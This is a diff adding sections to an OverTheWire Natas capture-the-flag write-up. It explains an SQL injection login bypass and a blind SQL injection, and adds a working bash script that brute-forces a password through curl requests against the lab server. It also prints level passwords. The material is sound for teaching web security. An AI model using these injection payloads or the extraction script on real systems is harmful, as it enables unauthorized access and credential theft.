@@ -342,7 +342,7 @@ And by checking the `/upload/al6r6jmwih.php` path we find the next password.
 
 Password: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
 
-# Level 14 → 15
+## Level 14 → 15
 As we log in, the website asks for username and password (aside from the initial login to `Natas14`). Looking at the given sourcecode, we can see an `SQL query`.
 
 ### SQL Injection
@@ -367,3 +367,50 @@ $query = "SELECT * from users where username="" or "1"="1" -- " and password=\""
 So, the query gets all the line where `username=""`, which is probably none, or `"1"="1"`, which is always true. Because it's a `or`, all lines return true to that condition and included in `$query`. Everything after the `--` is now a "comment" and doesnt matter. So all lines from `users` table get selected by `$query`, then we have at least one line and the login is successful.
 
 Password: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
+
+## Level 15 → 16
+There is one input for username, and the page checks if it exists. After trying some inputs, we get that the username `natas16` exists. Now we want to find it's password, but the only response we get from the server is either the user exists or it doesn't, so a simple `SQL Injection` will not work here, as we don't get the query response. 
+
+### Blind SQL Injection
+A `blind SQL injection` happens when a web application is vulnerable to SQL injection, but the results of the injected query are not directly visible in the page’s response. Instead of seeing data, the attacker must infer information based on how the application behaves, such as different page content, error messages, redirects, or response times. For example, an attacker might send a query that causes a delay only if a condition is true (like `...AND IF(password LIKE 'a%', SLEEP(5), 0)`), and measure the response time to deduce the password char by char. This makes `blind SQL injection` slower and more difficult, but still powerful for extracting sensitive data.
+
+The database table has `username` and `password` fields for each user. We will find `Natas16`'s password char by char by using some `SQL` features:
+* `LIKE` - that operator lets us search a field not by static value, but with a template. It compares char by char instead of full strings.
+* `%` - When using `LIKE`, `%` acts like a "wild card", for example `%a` fits all values ending with 'a'.
+* `BINARY` - that operator lets us compare by binary value, important for case sensitivity.
+
+We can see the query in the page sourcecode:
+```php
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+```
+Notice that the value comes from `$_REQUEST`, which can be either `GET`, `POST` or a cookie. We want to use injection to make it look like this:
+```sql
+SELECT * from users where username="natas16" and password LIKE BINARY "<prefix>%"
+```
+This way, we can brute force over the optional chars and everytime we add a char to the prefix. If we added a char and it's a currect prefix, the server will respond that this user exists. Then we add it to the prefix and try to guess the next char, until we have all 32 chars of the password. As explained, this is a type of `blind SQL injection`.
+
+```bash
+#!/bin/bash
+url="http://natas15.natas.labs.overthewire.org"
+credentials="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
+prefix=""
+chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+while [ ${#prefix} -lt 32 ]; do
+	for char in $(echo $chars | fold -w1); do
+		pref="${prefix}${char}";
+
+		response=$(curl -s -u $credentials "$url?username=natas16\"+and+password+LIKE+BINARY+\"$pref%");
+
+		if echo "$response" | grep -q "exists"; then
+			prefix=$pref
+			echo "Current: $prefix"
+			break
+		fi
+	done
+done
+echo $prefix
+```
+We run this code and get the next password.
+
+Password: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`
